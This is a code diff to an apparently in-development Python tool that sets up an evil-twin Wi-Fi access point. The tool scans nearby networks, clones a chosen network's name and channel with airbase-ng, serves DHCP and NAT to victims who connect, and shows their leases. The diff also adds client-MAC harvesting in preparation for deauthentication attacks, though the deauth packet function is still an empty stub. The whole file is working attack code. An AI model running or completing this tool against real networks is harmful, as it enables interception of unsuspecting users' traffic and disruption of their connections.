@@ -7,9 +7,15 @@ import sys
 import re
 import signal
 import argparse
+import logging
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
+conf.verb = 0
 from multiprocessing import Process
 from threading import Thread, Lock
+import socket
+import struct
+import fcntl
 
 # Console colors
 W  = '\033[0m'  # white (normal)
@@ -24,9 +30,14 @@ T  = '\033[93m' # tan
 
 DN = open(os.devnull, 'w')
 APs = {}
-chan = 0 # global for channel hopping Process
+chan = 0 # for channel hopping Process
 count = 0
 forw = '0\n'
+lock = Lock()
+ap_mac = '' # for sniff's cb function
+mon_mac1 = '' # for deauth sniff's cb
+mon_mac2 = '' # for deauth sniff's cb
+clients = [] # for deauth sniff's cb
 
 def parse_args():
     #Create the arguments
@@ -37,9 +48,9 @@ def parse_args():
     return parser.parse_args()
 
 
-###############
-# AP TARGETING
-###############
+########################
+# AP TARGETING & DEAUTH
+########################
 
 def target_APs():
     os.system('clear')
@@ -49,21 +60,7 @@ def target_APs():
     for ap in APs:
         print G+str(ap).ljust(2)+W+' - '+APs[ap][0].ljust(2)+' - '+T+APs[ap][1]+W
 
-def cb(pkt):
-    global APs, count
-    if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
-        ap_channel = str(ord(pkt[Dot11Elt:3].info))
-        essid = pkt[Dot11Elt].info
-        mac = pkt[Dot11].addr2
-        if len(APs) > 0:
-            for num in APs:
-                if essid in APs[num][1]:
-                    return
-        count += 1
-        APs[count] = [ap_channel, essid, mac]
-        target_APs()
-
-def channel_hop(mon_mode):
+def channel_hop(mon_iface):
     global chan
     while 1:
         try:
@@ -71,15 +68,12 @@ def channel_hop(mon_mode):
                 chan = 0
             chan = chan+1
             channel = str(chan)
-            Popen(['iw', 'dev', mon_mode, 'set', 'channel', channel], stdout=DN, stderr=DN)
+            Popen(['iw', 'dev', mon_iface, 'set', 'channel', channel], stdout=DN, stderr=DN)
             time.sleep(2)
         except KeyboardInterrupt:
             sys.exit()
 
-def sniffing(mon_mode):
-    sniff(iface=mon_mode, prn=cb, store=0)
-
-def copy_AP():
+def copy_AP(inet_iface, interfaces, args):
     copy = None
     while not copy:
         try:
@@ -91,19 +85,79 @@ def copy_AP():
     channel = APs[copy][0]
     essid = APs[copy][1]
     mac = APs[copy][2]
-# Make a funciton here? ############################################3
-    yn = raw_input('['+G+'+'+W+'] Deauthenticate clients on '+T+essid+W+' at '+T+mac+W+'? [y/n]: ')
-    if yn == 'y':
-        target_deauth()
     return channel, essid, mac
 
-def target_deauth():
+def deauth_cb(pkt):
+    global clients, mon_mac2
+    if pkt.haslayer(Dot11):
+        if pkt.type in [1,2] and pkt.addr1 and pkt.addr2: # 1 management, 2 data
+
+            if pkt.addr1 == ap_mac or pkt.addr2 == ap_mac:
+                print pkt.addr1, pkt.addr2
+
+            ignore = ['ff:ff:ff:ff:ff:ff', '00:00:00:00:00:00', '33:33:00:', '33:33:ff:', '01:80:c2:00:00:00', '01:00:5e:', mon_mac1, mon_mac2]
+            for i in ignore:
+                if i in pkt.addr1 or i in pkt.addr2:
+                    return
+
+            if pkt.addr1 == ap_mac:
+                for c in clients:
+                    if pkt.addr2 == c:
+                        return
+                with lock:
+                    clients.append(pkt.addr2)
+            elif pkt.addr2 == ap_mac:
+                for c in clients:
+                    if pkt.addr1 == c:
+                        return
+                with lock:
+                    clients.append(pkt.addr1)
+#    print clients
+
+
+def target_deauth(inet_iface, interfaces, essid, ap_mac, channel):
+    global mon_mac2
+    yn = raw_input('['+G+'+'+W+'] Deauthenticate clients on '+T+essid+W+' at '+T+ap_mac+W+'? [y/n]: ')
+    if yn == 'y':
+        for i in interfaces:
+            if inet_iface == i:
+                mon_iface2 = start_monitor(i, channel)
+                mon_mac2 = get_mon_mac(mon_iface2)
+                print '['+T+'*'+W+'] Started '+T+mon_iface2+W+' on '+T+mon_mac2+W+' for deauthentication'
+                break
+
+        #dcb = deauth_cb
+        s = Thread(target=sniffing, args=(mon_iface2, deauth_cb))
+        s.daemon = True
+        s.start()
+
+#        thread here ##########################################################
+
+def targeting_cb(pkt):
+    """Callback for the first sniff() targeting"""
+    global APs, count
+    if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
+        try:
+            ap_channel = str(ord(pkt[Dot11Elt:3].info))
+        except Exception:
+            return
+        essid = pkt[Dot11Elt].info
+        mac = pkt[Dot11].addr2
+        if len(APs) > 0:
+            for num in APs:
+                if essid in APs[num][1]:
+                    return
+        count += 1
+        APs[count] = [ap_channel, essid, mac]
+        target_APs()
+
+def deauth_pkt(pkt):
     pass
 
 
-##################
-# END AP TARGETING
-##################
+####################################
+# END AP TARGETING & DEAUTH
+####################################
 
 
 def iwconfig():
@@ -113,9 +167,9 @@ def iwconfig():
     for line in proc.communicate()[0].split('\n'):
         if len(line) == 0: continue # Isn't an empty string
         if line[0] != ' ': # Doesn't start with space
-            wired_search = re.search('eth[0-9]|em[0-9]|p[1-9]p[1-9]', line)
-            if not wired_search: # Isn't wired
-                iface = line[:line.find(' ')] # is the interface
+            ignore_iface = re.search('eth[0-9]|em[0-9]|p[1-9]p[1-9]|at[0-9]', line)
+            if not ignore_iface: # Isn't wired or at0 tunnel
+                iface = line[:line.find(' ')] # is the interface name
                 if 'Mode:Monitor' in line:
                     monitors.append(iface)
                 elif 'IEEE 802.11' in line:
@@ -123,23 +177,33 @@ def iwconfig():
                         interfaces[iface] = 1
                     else:
                         interfaces[iface] = 0
-    if len(interfaces) < 2:
-        sys.exit('[-] You need at least 2 wireless interfaces. Please bring 2 up and retry.')
+#    if len(interfaces) < 2:
+#        sys.exit('[-] You need at least 2 wireless interfaces. Please bring 2 up and retry.')
     return monitors, interfaces
 
-def rm_mon(monitors):
+def rm_mon():
+    monitors, interfaces = iwconfig()
     for m in monitors:
         if 'mon' in m:
             Popen(['airmon-ng', 'stop', m], stdout=DN, stderr=DN)
         else:
+            Popen(['ifconfig', m, 'down'], stdout=DN, stderr=DN)
             Popen(['iw', 'dev', m, 'mode', 'managed'], stdout=DN, stderr=DN)
+            Popen(['ifconfig', m, 'up'], stdout=DN, stderr=DN)
 
 def internet_info(interfaces):
+    inet_iface = None
     proc = Popen(['/sbin/ip', 'route'], stdout=PIPE, stderr=DN)
-    def_route = proc.communicate()[0].split('\n')[0].split()
-    inet_iface = def_route[4]
-    ipprefix = def_route[2][:2] # Just checking if it's 19, 17, or 10
-    return inet_iface, ipprefix
+    def_route = proc.communicate()[0].split('\n')#[0].split()
+    for line in def_route:
+        if 'default via' in line:
+            line = line.split()
+            inet_iface = line[4]
+            ipprefix = line[2][:2] # Just checking if it's 192, 172, or 10
+    if inet_iface:
+        return inet_iface, ipprefix
+    else:
+        sys.exit('['+R+'!'+W+'] No active internet connection found, exiting')
 
 def AP_iface(interfaces, inet_iface):
     for i in interfaces:
@@ -160,30 +224,35 @@ def iptables(inet_iface):
         print '['+T+'*'+W+'] Enabled IP forwarding'
         return forw
 
-def start_monitor(ap_iface, args):
-    print '['+T+'*'+W+'] Setting up monitor mode'
-    channel = '6'
-    if args.channel:
-        channel = args.channel
+def start_monitor(ap_iface, channel):
     proc = Popen(['airmon-ng', 'start', ap_iface, channel], stdout=PIPE, stderr=DN)
     for line in proc.communicate()[0].split('\n'):
         if "monitor mode enabled" in line:
             line = line.split()
-            mon_mode = line[4][:-1]
-            return mon_mode
+            mon_iface = line[4][:-1]
+            return mon_iface
 
-def start_ap(mon_mode, args, channel, essid):
-    if args.channel:
-        channel = args.channel
-    if args.essid:
-        essid = args.essid
-    Popen(['airbase-ng', '-c', channel, '-e', essid, '-v', mon_mode], stdout=DN, stderr=DN)
+def get_mon_mac(mon_iface):
+    '''
+    http://stackoverflow.com/questions/159137/getting-mac-address
+    '''
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    info = fcntl.ioctl(s.fileno(), 0x8927, struct.pack('256s', mon_iface[:15]))
+    mac = ''.join(['%02x:' % ord(char) for char in info[18:24]])[:-1]
+#    print '['+G+'*'+W+'] Monitor mode: '+G+mon_iface+W+' - '+O+mac+W
+    return mac
+
+def start_ap(mon_iface, channel, essid):
+    Popen(['airbase-ng', '-c', channel, '-e', essid, '-v', mon_iface], stdout=DN, stderr=DN)
     try:
         time.sleep(6) # Copied from Pwnstar which said it was necessary?
     except KeyboardInterrupt:
         cleanup(None, None)
     Popen(['ifconfig', 'at0', 'up', '10.0.0.1', 'netmask', '255.255.255.0'], stdout=DN, stderr=DN)
     Popen(['ifconfig', 'at0', 'mtu', '1400'], stdout=DN, stderr=DN)
+
+def sniffing(interface, cb):
+    sniff(iface=interface, prn=cb, store=0)
 
 def dhcp_conf(ipprefix):
     config = ('default-lease-time 300;\n'
@@ -200,19 +269,28 @@ def dhcp_conf(ipprefix):
         with open('/tmp/dhcpd.conf', 'w') as dhcpconf:
             # subnet, range, router, dns
             dhcpconf.write(config % ('10.0.0.0', '10.0.0.2 10.0.0.100', '10.0.0.1', '8.8.8.8'))
-    elif iprefix == '10':
+    elif ipprefix == '10':
         with open('/tmp/dhcpd.conf', 'w') as dhcpconf:
             dhcpconf.write(config % ('172.16.0.0', '172.16.0.2 172.16.0.100', '172.16.0.1', '8.8.8.8'))
     return '/tmp/dhcpd.conf'
 
 def dhcp(dhcpconf, ipprefix):
-    print '['+T+'*'+W+'] Clearing leases and starting DHCP'
+    #print '['+T+'*'+W+'] Clearing leases and starting DHCP'
     os.system('echo > /var/lib/dhcp/dhcpd.leases')
     dhcp = Popen(['dhcpd', '-cf', dhcpconf], stdout=PIPE, stderr=DN)
     if ipprefix == '19' or ipprefix == '17':
         os.system('route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1')
     else:
         os.system('route add -net 172.16.0.0 netmask 255.255.255.0 gw 172.16.0.1')
+
+def mon_mac(mon_iface):
+    '''
+    http://stackoverflow.com/questions/159137/getting-mac-address
+    '''
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    info = fcntl.ioctl(s.fileno(), 0x8927, struct.pack('256s', mon_iface[:15]))
+    mac = ''.join(['%02x:' % ord(char) for char in info[18:24]])[:-1]
+    return mac
 
 def cleanup(signal, frame):
     global forw
@@ -225,36 +303,47 @@ def cleanup(signal, frame):
     os.system('iptables -t nat -X')
     os.system('pkill airbase-ng')
     os.system('pkill dhcpd') # Dangerous?
+    rm_mon()
+#    os.system('ifconfig at0 down')
     sys.exit(0)
 
 def main(args):
-    global ipf, mon_mode
+    global ipf, mon_iface, ap_mac, mon_mac1
     channel = '1'
+    if args.channel:
+        channel = args.channel
     essid = 'Free Wifi'
+    if args.essid:
+        essid = args.essid
 
     monitors, interfaces = iwconfig()
-    rm_mon(monitors)
+    if len(interfaces) < 2:
+        sys.exit('[-] You need at least 2 wireless interfaces. Please bring 2 up and retry.')
+    rm_mon()
     inet_iface, ipprefix = internet_info(interfaces)
     ap_iface = AP_iface(interfaces, inet_iface)
     ipf = iptables(inet_iface)
-    mon_mode = start_monitor(ap_iface, args)
+    mon_iface = start_monitor(ap_iface, channel)
+    mon_mac1 = get_mon_mac(mon_iface)
     if args.targeting:
-        hop = Process(target=channel_hop, args=(mon_mode,))
+        hop = Process(target=channel_hop, args=(mon_iface,))
         hop.start()
-        sniffing(mon_mode)
+        tcb = targeting_cb
+        sniffing(mon_iface, tcb)
         hop.terminate()
-        channel, essid, mac = copy_AP()
-    start_ap(mon_mode, args, channel, essid)
+        channel, essid, ap_mac = copy_AP(inet_iface, interfaces, args) # these 2 args are for target_deauth()
+        target_deauth(inet_iface, interfaces, essid, ap_mac, channel)
+    start_ap(mon_iface, channel, essid)
     dhcpconf = dhcp_conf(ipprefix)
     dhcp(dhcpconf, ipprefix)
     signal.signal(signal.SIGINT, cleanup)
     while 1:
         os.system('clear')
-        print '['+T+'*'+W+'] Finished setting up '+T+essid+W+' on channel '+T+channel+W
-        print '    DHCP leases updated every 5 seconds:\n'
+        print '['+T+'*'+W+'] '+T+essid+W+' set up on channel '+T+channel+W
+        print '    DHCP leases:\n'
         proc = Popen(['cat', '/var/lib/dhcp/dhcpd.leases'], stdout=PIPE, stderr=DN)
         for line in proc.communicate()[0].split('\n'):
             print line
-        time.sleep(5)
+        time.sleep(2)
 
 main(parse_args())
